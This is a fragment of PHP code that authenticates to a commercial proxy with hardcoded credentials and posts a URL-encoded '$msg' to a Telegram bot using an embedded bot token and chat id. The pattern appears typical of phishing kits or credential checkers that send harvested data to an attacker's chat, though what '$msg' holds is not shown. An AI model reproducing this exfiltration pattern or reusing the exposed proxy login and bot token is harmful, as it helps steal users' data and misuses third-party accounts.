...
$hydra = "dLwZkHmc1W:WP1TkGrv22";
$ip = "proxies.instaproxy.io:4678";
$proxy = ''.$ip.'';
$proxyauth = ''.$hydra.'';
...
$text = urlencode($msg);
file_get_contents("https://api.telegram.org/bot5862602021:AAFwi2wkbsmGqfk9U2JOkFBioLRXGDRvDyg/sendMessage?chat_id=5499042832&text=$text&parse_mode=HTML");
